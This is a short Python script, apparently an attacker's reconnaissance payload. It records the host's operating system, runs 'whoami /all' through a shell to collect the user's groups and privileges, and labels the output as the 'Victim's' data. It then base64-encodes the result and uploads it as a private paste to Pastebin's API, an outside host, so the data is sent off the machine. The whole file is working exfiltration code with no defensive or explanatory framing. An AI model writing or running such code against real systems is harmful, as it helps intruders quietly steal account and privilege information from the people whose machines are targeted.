import requests, base64, platform
from subprocess import PIPE, Popen

API_ENDPOINT = "https://pastebin.com/api/api_post.php"
API_KEY = "<UNIQUE_DEVELOPER_API_KEY>"

message = "Recon result\n"
message += f"Victim's OS: {platform.platform()}\n\n"

process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
result, error = process.communicate()

if result == b'':
    message += error.decode()
else:
    message += result.decode()

message = base64.b64encode(message.encode())

data = {
    'api_dev_key': API_KEY,
    'api_option': 'paste',
    'api_paste_private': '1',
    'api_paste_code': message
}

resp = requests.post(url=API_ENDPOINT, data=data)
pastebin_url = resp.text
print(f"URL: {pastebin_url}")